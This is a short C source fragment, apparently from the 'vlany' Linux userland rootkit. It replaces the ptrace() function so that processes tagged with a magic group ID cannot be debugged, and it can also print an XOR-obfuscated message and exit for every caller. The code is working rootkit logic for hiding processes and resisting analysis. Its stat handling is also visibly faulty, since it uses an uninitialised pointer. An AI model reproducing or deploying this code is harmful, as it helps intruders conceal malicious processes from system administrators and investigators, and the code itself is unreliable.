long ptrace(void *request, pid_t pid, void *addr, void *data)
{
    #ifdef DEBUG
        printf("[vlany] ptrace() called\n");
    #endif
    
    HOOK(old_ptrace, CPTRACE);
    
    if(owned()) return old_ptrace(request, pid, addr, data);
    
    // little more process hiding.. prevent brute debugging of hidden processes
    char proc_path[128];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
    
    HOOK(old_xstat, C__XSTAT);
    struct stat *pstat;
    memset(&pstat, 0, sizeof(pstat));
    if(old_xstat(_STAT_VER, proc_path, pstat) < 0) return old_ptrace(request, pid, addr, data);
    if(pstat->st_gid == MAGIC_GID) { errno = ESRCH; exit(-1); }

    #ifndef PTRACE_BUG
        return old_ptrace(request, pid, addr, data);
    #endif

    char *ptrace_bug_msg = strdup(PTRACE_BUG_MSG);
    xor(ptrace_bug_msg);
    printf("%s\n", ptrace_bug_msg);
    cleanup(ptrace_bug_msg, strlen(ptrace_bug_msg));
    exit(-1);
}
